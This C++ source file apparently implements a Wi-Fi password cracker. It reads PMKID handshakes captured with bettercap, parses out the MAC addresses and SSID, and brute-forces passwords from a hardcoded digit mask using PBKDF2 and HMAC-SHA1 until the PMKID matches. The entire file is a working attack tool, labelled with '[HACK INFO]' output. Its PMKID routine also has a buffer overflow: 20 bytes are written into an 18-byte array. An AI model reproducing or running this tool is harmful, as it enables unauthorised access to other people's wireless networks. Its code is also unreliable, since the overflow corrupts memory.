#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <chrono>
#include <fstream>
#include <sstream>
#include <openssl/hmac.h>
#include <openssl/evp.h>

using namespace std;
using namespace std::chrono;

void hexstr_to_bytes(const char *hexstr, unsigned char *bytes, size_t bytes_len) {
    for (size_t i = 0; i < bytes_len; i++) {
        sscanf(hexstr + 2 * i, "%2hhx", &bytes[i]);
    }
}

void calculate_pmk(char *password, char *ssid, int ssid_len, unsigned char *pmk) {
    int iterations = 4096;
    int pmk_len = 32;

    PKCS5_PBKDF2_HMAC_SHA1(password, strlen(password), (unsigned char*)ssid, ssid_len, iterations, pmk_len, pmk);
}

string calculate_pmkid(unsigned char* pmk, const char* aa, const char* spa) {
    unsigned char result[EVP_MAX_MD_SIZE];
    unsigned int result_len = 0;

    unsigned char aa_bytes[6];
    unsigned char spa_bytes[6];

    hexstr_to_bytes(aa, aa_bytes, 6);
    hexstr_to_bytes(spa, spa_bytes, 6);

    unsigned char message[18] = "PMK Name";
    memcpy(message + 8, aa_bytes, 6);
    memcpy(message + 14, spa_bytes, 6);

    HMAC(EVP_sha1(), pmk, 32, message, 20, result, &result_len);

    string pmkid;
    for (unsigned int i = 0; i < 16; i++) {
        char hex[3];
        sprintf(hex, "%02x", result[i]);
        pmkid += hex;
    }

    return pmkid;
}

vector<string> expand_mask(const string& mask, size_t index, const string& current) {
    if (index == mask.length()) {
        return {current};
    }

    vector<string> results;
    char c = mask[index];

    if (c == '?') {
        if (index + 1 < mask.length()) {
            char next = mask[index + 1];
            string chars;

            if (next == 'u') chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            else if (next == 'l') chars = "abcdefghijklmnopqrstuvwxyz";
            else if (next == 'd') chars = "0123456789";
            else if (next == 's') chars = "!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~";
            else if (next == 'a') chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~";
            else if (next == 'c') chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

            for (char ch : chars) {
                vector<string> expanded = expand_mask(mask, index + 2, current + ch);
                results.insert(results.end(), expanded.begin(), expanded.end());
            }
        }
    } else {
        results = expand_mask(mask, index + 1, current + c);
    }

    return results;
}

vector<string> get_passwords(const string& guess_mask) {
    return expand_mask(guess_mask, 0, "");
}

string hex_to_string(const string& hex) {
    string ascii;
    for (size_t i = 0; i < hex.length(); i += 2) {
        string part = hex.substr(i, 2);

        char ch = static_cast<char>(strtol(part.c_str(), nullptr, 16));
        ascii += ch;
    }
    return ascii;
}

bool parse_line(const string& line, string& pmkid_to_check, string& ssid_hex, string& aa, string& spa) {
    size_t start = 0, end;
    end = line.find('*', start);
    if (end == string::npos) return false;
    start = end + 1;

    end = line.find('*', start);
    if (end == string::npos) return false;
    start = end + 1;

    end = line.find('*', start);
    if (end == string::npos) return false;
    pmkid_to_check = line.substr(start, end - start);
    start = end + 1;

    end = line.find('*', start);
    if (end == string::npos) return false;
    aa = line.substr(start, end - start);
    start = end + 1;

    end = line.find('*', start);
    if (end == string::npos) return false;
    spa = line.substr(start, end - start);
    start = end + 1;

    end = line.find('*', start);
    if (end == string::npos) return false;
    ssid_hex = line.substr(start, end - start);
    start = end + 1;

    return true;
}

int main() {
    ifstream infile("../bettercap-wifi-handshakes.pmkid");
    if (!infile) {
        printf("File could not be opened.\n");
        return 1;
    }
    string line;

    while (getline(infile, line)) {
        printf("\n\n------NEW NETWORK------\n");

        printf("\n[NETWORK INFO]\n");
        printf("Handshake: %s\n", line.c_str());

        stringstream ss(line);
        string pmkid_to_check, ssid_hex, aa, spa;

        if (!parse_line(line, pmkid_to_check, ssid_hex, aa, spa)) {
            printf("Wrong line format.\n");
            continue;
        }

        printf("Captured PMKID: %s\n", pmkid_to_check.c_str());
        printf("Target MAC Address: %s\n", aa.c_str());
        printf("Source MAC Address: %s\n", spa.c_str());
        string ssid = hex_to_string(ssid_hex);
        printf("SSID: %s\n", ssid.c_str());

        vector<string> passwords = get_passwords("?d?d?d80687");

        auto total_start = high_resolution_clock::now();
        double total_duration = 0;

        printf("\n[HACK INFO]\n");
        printf("Trying to crack \"%s\", ", ssid.c_str());

        bool is_printed = false;
        int print_after = 3;
        int index = 0;
        bool cracked = false;
        for (const string& password : passwords) {
            index++;

            auto start = high_resolution_clock::now();

            unsigned char pmk[32];
            calculate_pmk(const_cast<char*>(password.c_str()), const_cast<char*>(ssid.c_str()), ssid.length(), pmk);

            string pmkid = calculate_pmkid(pmk, aa.c_str(), spa.c_str());

            //printf("Trying password: %s, PMKID: %s\n", password.c_str(), pmkid.c_str());

            auto end = high_resolution_clock::now();
            duration<double> time_taken = duration_cast<duration<double>>(end - start);
            total_duration += time_taken.count();

            if (pmkid == pmkid_to_check) {
                printf("Match found with password: %s\n", password.c_str());
                cracked = true;
                break;
            }

            if (is_printed || print_after != index) {
                continue;
            }

            double estimated_total = total_duration * passwords.size() / print_after;
            printf("Estimated total time: %.2f seconds\n", estimated_total);
            is_printed = true;
        }

        if (!cracked) {
            printf("Password could not be found.\n");
        }

        auto total_end = high_resolution_clock::now();
        duration<double> total_time_taken = duration_cast<duration<double>>(total_end - total_start);

        printf("Total time taken: %.2f seconds\n", total_time_taken.count());
    }

    return 0;
}
